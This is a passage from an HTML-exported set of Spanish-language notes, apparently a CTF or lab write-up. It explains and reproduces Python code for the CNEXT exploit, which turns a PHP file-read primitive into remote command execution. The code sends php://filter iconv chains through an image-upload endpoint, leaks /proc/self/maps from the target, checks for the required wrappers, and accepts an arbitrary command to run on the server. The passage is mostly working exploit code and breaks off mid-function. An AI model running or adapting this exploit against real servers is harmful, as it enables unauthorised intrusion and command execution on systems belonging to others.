<li data-line="3" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p><strong><code>get_symbols_and_addresses</code>:</strong></p>
<ul>
<li data-line="5" dir="auto">Lee el archivo <code>/proc/self/maps</code> para obtener las regiones de memoria del proceso PHP.</li>
<li data-line="6" dir="auto">Busca la dirección base de <code>libc</code> y el montón (<code>heap</code>) en la memoria.</li>
<li data-line="7" dir="auto">Descarga una copia local de <code>libc.so.6</code> para analizar símbolos y direcciones específicas.</li>
</ul>
</li>
<li data-line="9" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p><strong><code>build_exploit_path</code>:</strong></p>
<ul>
<li data-line="11" dir="auto">Construye el payload malicioso que explotará la vulnerabilidad.</li>
<li data-line="12" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<ul>
<li data-line="13" dir="auto">Creación de bloques (<code>buckets</code>) personalizados.</li>
<li data-line="14" dir="auto">Manipulación del heap mediante técnicas como <code>dechunk</code> y <code>convert.iconv</code>.</li>
<li data-line="15" dir="auto">Sobrescritura del puntero <code>free_slot</code> para controlar la asignación de memoria.</li>
</ul>
</li>
</ul>
</li>
<li data-line="17" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p><strong><code>exploit</code>:</strong></p>
<ul>
<li data-line="19" dir="auto">Envía el payload final al servidor objetivo.</li>
<li data-line="20" dir="auto">Espera un tiempo configurado (<code>sleep</code>) para verificar si el exploit fue exitoso.</li>
</ul>
</li>
</ol></div></div></div><div class="el-h4 heading-wrapper"><h4 data-heading="**b) Class `Exploit`**" dir="auto" class="heading" id="**b)_Class_`Exploit`**"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><strong>b) Class <code>Exploit</code></strong></h4><div class="heading-children"><div class="el-p"><p dir="auto">La clase <code>Exploit</code> es la parte principal del script. Contiene toda la lógica necesaria para construir y enviar el payload malicioso.</p></div><div class="el-h5 heading-wrapper"><h5 data-heading="**Funciones clave:**" dir="auto" class="heading" id="**Funciones_clave:**"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><strong>Funciones clave:</strong></h5><div class="heading-children"><div class="el-ol"><ol>
<li data-line="0" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p><strong><code>check_vulnerable</code>:</strong></p>
<ul>
<li data-line="2" dir="auto">Verifica si el sistema objetivo es vulnerable.</li>
<li data-line="3" dir="auto">Comprueba si los wrappers <code>data://</code>, <code>php://filter</code> y la extensión <code>zlib</code> están habilitados.</li>
<li data-line="4" dir="auto">Si alguno de estos no está disponible, el exploit no funcionará.</li>
</ul>
</li>
<li data-line="5" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p><strong><code>get_symbols_and_addresses</code>:</strong></p>
<ul>
<li data-line="7" dir="auto">Lee el archivo <code>/proc/self/maps</code> para obtener las regiones de memoria del proceso PHP.</li>
<li data-line="8" dir="auto">Busca la dirección base de <code>libc</code> y el montón (<code>heap</code>) en la memoria.</li>
<li data-line="9" dir="auto">Descarga una copia local de <code>libc.so.6</code> para analizar símbolos y direcciones específicas.</li>
</ul>
</li>
<li data-line="10" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p><strong><code>build_exploit_path</code>:</strong></p>
<ul>
<li data-line="12" dir="auto">Construye el payload malicioso que explotará la vulnerabilidad.</li>
<li data-line="13" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Utiliza técnicas avanzadas como:
<ul>
<li data-line="14" dir="auto">Creación de bloques (<code>buckets</code>) personalizados.</li>
<li data-line="15" dir="auto">Manipulación del montón mediante técnicas como <code>dechunk</code> y <code>convert.iconv</code>.</li>
<li data-line="16" dir="auto">Sobrescritura del puntero <code>free_slot</code> para controlar la asignación de memoria.</li>
</ul>
</li>
</ul>
</li>
<li data-line="17" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p><strong><code>exploit</code>:</strong></p>
<ul>
<li data-line="19" dir="auto">Envía el payload final al servidor objetivo.</li>
<li data-line="20" dir="auto">Espera un tiempo configurado (<code>sleep</code>) para verificar si el exploit fue exitoso.</li>
</ul>
</li>
</ol></div><div class="el-pre"><pre class="language-python" tabindex="0"><code data-line="0" class="language-python is-loaded">
<span class="token keyword">from</span> __future__ <span class="token keyword">import</span> annotations

<span class="token keyword">import</span> base64
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
<span class="token keyword">import</span> zlib
<span class="token keyword">import</span> urllib

<span class="token keyword">from</span> dataclasses <span class="token keyword">import</span> dataclass
<span class="token keyword">from</span> requests<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ConnectionError<span class="token punctuation">,</span> ChunkedEncodingError

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> ten <span class="token keyword">import</span> <span class="token operator">*</span>


HEAP_SIZE <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>
BUG <span class="token operator">=</span> <span class="token string">"劄"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">Remote</span><span class="token punctuation">:</span>

    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>url <span class="token operator">=</span> url
        self<span class="token punctuation">.</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> Response<span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""Sends given `path` to the HTTP server. Returns the response.
        """</span>

        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'action'</span> <span class="token punctuation">:</span> <span class="token string">'upload_image_from_url'</span><span class="token punctuation">,</span>
                <span class="token string">'url'</span> <span class="token punctuation">:</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote_plus<span class="token punctuation">(</span><span class="token string">'php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource='</span><span class="token operator">+</span>path<span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token string">'id'</span> <span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span>
                <span class="token string">'accepted_files'</span> <span class="token punctuation">:</span> <span class="token string">'image/gif'</span><span class="token punctuation">}</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>


    <span class="token keyword">def</span> <span class="token function">send_exploit</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> payload<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> Response<span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""Sends the payload to the server.
        """</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'action'</span> <span class="token punctuation">:</span> <span class="token string">'upload_image_from_url'</span><span class="token punctuation">,</span>
                <span class="token string">'url'</span> <span class="token punctuation">:</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote_plus<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token string">'id'</span> <span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span>
                <span class="token string">'accepted_files'</span> <span class="token punctuation">:</span> <span class="token string">'image/gif'</span><span class="token punctuation">}</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        
    <span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""Returns the contents of a remote file.
        """</span>
        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/convert.base64-encode/resource=</span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string">"</span></span>
        file_path <span class="token operator">=</span> self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'response'</span><span class="token punctuation">]</span>
        
        <span class="token keyword">if</span> <span class="token string">'File type'</span> <span class="token keyword">in</span> file_path<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token string">b''</span>
        
        response <span class="token operator">=</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>
        data <span class="token operator">=</span> response<span class="token punctuation">.</span>content<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        <span class="token keyword">return</span> data

    <span class="token keyword">def</span> <span class="token function">data_decode</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">:</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token builtin">bytes</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>data <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">'='</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@entry</span>
<span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">,</span> <span class="token string">"Target URL"</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"command"</span><span class="token punctuation">,</span> <span class="token string">"Command to run on the system; limited to 0x140 bytes"</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"sleep"</span><span class="token punctuation">,</span> <span class="token string">"Time to sleep to assert that the exploit worked. By default, 1."</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"heap"</span><span class="token punctuation">,</span> <span class="token string">"Address of the main zend_mm_heap structure."</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span>
    <span class="token string">"pad"</span><span class="token punctuation">,</span>
    <span class="token string">"Number of 0x100 chunks to pad with. If the website makes a lot of heap "</span>
    <span class="token string">"operations with this size, increase this. Defaults to 20."</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@dataclass</span>
<span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""CNEXT exploit: RCE using a file read primitive in PHP."""</span>

    url<span class="token punctuation">:</span> <span class="token builtin">str</span>
    command<span class="token punctuation">:</span> <span class="token builtin">str</span>
    sleep<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">1</span>
    heap<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token boolean">None</span>
    pad<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">20</span>

    <span class="token keyword">def</span> <span class="token function">__post_init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>remote <span class="token operator">=</span> Remote<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>log <span class="token operator">=</span> logger<span class="token punctuation">(</span><span class="token string">"EXPLOIT"</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>info <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
        self<span class="token punctuation">.</span>heap <span class="token operator">=</span> self<span class="token punctuation">.</span>heap <span class="token keyword">and</span> <span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>heap<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">check_vulnerable</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""Checks whether the target is reachable and properly allows for the various
        wrappers and filters that the exploit needs.
        """</span>
        
        <span class="token keyword">def</span> <span class="token function">safe_download</span><span class="token punctuation">(</span>path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>
            <span class="token keyword">except</span> ConnectionError<span class="token punctuation">:</span>
                failure<span class="token punctuation">(</span><span class="token string">"Target not [b]reachable[/] ?"</span><span class="token punctuation">)</span>
            

        <span class="token keyword">def</span> <span class="token function">check_token</span><span class="token punctuation">(</span>text<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bool</span><span class="token punctuation">:</span>
            result <span class="token operator">=</span> safe_download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>

            <span class="token keyword">return</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">.</span>intersection<span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span>

        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span><span class="token string">b'GIF89a'</span> <span class="token operator">+</span> text<span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">{</span>base64<span class="token punctuation">}</span></span><span class="token string">"</span></span>
        
        result <span class="token operator">=</span> safe_download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>
        
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">.</span>intersection<span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            msg_failure<span class="token punctuation">(</span><span class="token string">"Remote.download did not return the test string"</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--------------------"</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Expected test string: </span><span class="token interpolation"><span class="token punctuation">{</span>text<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Got: </span><span class="token interpolation"><span class="token punctuation">{</span>result<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--------------------"</span><span class="token punctuation">)</span>
            failure<span class="token punctuation">(</span><span class="token string">"If your code works fine, it means that the [i]data://[/] wrapper does not work"</span><span class="token punctuation">)</span>

        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]data://[/] wrapper works"</span><span class="token punctuation">)</span>

        text <span class="token operator">=</span> <span class="token string">'GIF89a'</span> <span class="token operator">+</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>
        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter//resource=data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">{</span>base64<span class="token punctuation">}</span></span><span class="token string">"</span></span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> check_token<span class="token punctuation">(</span>text<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>
            failure<span class="token punctuation">(</span><span class="token string">"The [i]php://filter/[/] wrapper does not work"</span><span class="token punctuation">)</span>

        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]php://filter/[/] wrapper works"</span><span class="token punctuation">)</span>

        text <span class="token operator">=</span> <span class="token string">'GIF89a'</span> <span class="token operator">+</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>
        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>compress<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/zlib.inflate/resource=data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">{</span>base64<span class="token punctuation">}</span></span><span class="token string">"</span></span>

        <span class="token keyword">if</span> <span class="token keyword">not</span> check_token<span class="token punctuation">(</span>text<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>
            failure<span class="token punctuation">(</span><span class="token string">"The [i]zlib[/] extension is not enabled"</span><span class="token punctuation">)</span>

        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]zlib[/] extension is enabled"</span><span class="token punctuation">)</span>

        msg_success<span class="token punctuation">(</span><span class="token string">"Exploit preconditions are satisfied"</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">get_file</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
        <span class="token keyword">with</span> msg_status<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Downloading [i]</span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string">[/]..."</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">get_regions</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""Obtains the memory regions of the PHP process by querying /proc/self/maps."""</span>
        maps <span class="token operator">=</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>data_decode<span class="token punctuation">(</span>self<span class="token punctuation">.</span>get_file<span class="token punctuation">(</span><span class="token string">"/proc/self/maps"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        
        PATTERN <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>
            <span class="token string">r"^([a-f0-9]+)-([a-f0-9]+)\b"</span> <span class="token string">r".*"</span> <span class="token string">r"\s([-rwx]{3}[ps])\s"</span> <span class="token string">r"(.*)"</span>
        <span class="token punctuation">)</span>
        regions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        <span class="token keyword">for</span> region <span class="token keyword">in</span> table<span class="token punctuation">.</span>split<span class="token punctuation">(</span>maps<span class="token punctuation">,</span> strip<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token keyword">match</span> <span class="token operator">:=</span> PATTERN<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>region<span class="token punctuation">)</span><span class="token punctuation">:</span>
                start <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
                stop <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
                permissions <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
                path <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> <span class="token string">"/"</span> <span class="token keyword">in</span> path <span class="token keyword">or</span> <span class="token string">"["</span> <span class="token keyword">in</span> path<span class="token punctuation">:</span>
                    path <span class="token operator">=</span> path<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    path <span class="token operator">=</span> <span class="token string">""</span>
                current <span class="token operator">=</span> Region<span class="token punctuation">(</span>start<span class="token punctuation">,</span> stop<span class="token punctuation">,</span> permissions<span class="token punctuation">,</span> path<span class="token punctuation">)</span>
                regions<span class="token punctuation">.</span>append<span class="token punctuation">(</span>current<span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                failure<span class="token punctuation">(</span><span class="token string">"Unable to parse memory mappings"</span><span class="token punctuation">)</span>

        self<span class="token punctuation">.</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Got </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">len</span><span class="token punctuation">(</span>regions<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string"> memory regions"</span></span><span class="token punctuation">)</span>

        <span class="token keyword">return</span> regions

    <span class="token keyword">def</span> <span class="token function">get_symbols_and_addresses</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""Obtains useful symbols and addresses from the file read primitive."""</span>
        regions <span class="token operator">=</span> self<span class="token punctuation">.</span>get_regions<span class="token punctuation">(</span><span class="token punctuation">)</span>

        LIBC_FILE <span class="token operator">=</span> <span class="token string">"./libc.so.6"</span>

        <span class="token comment"># PHP's heap</span>

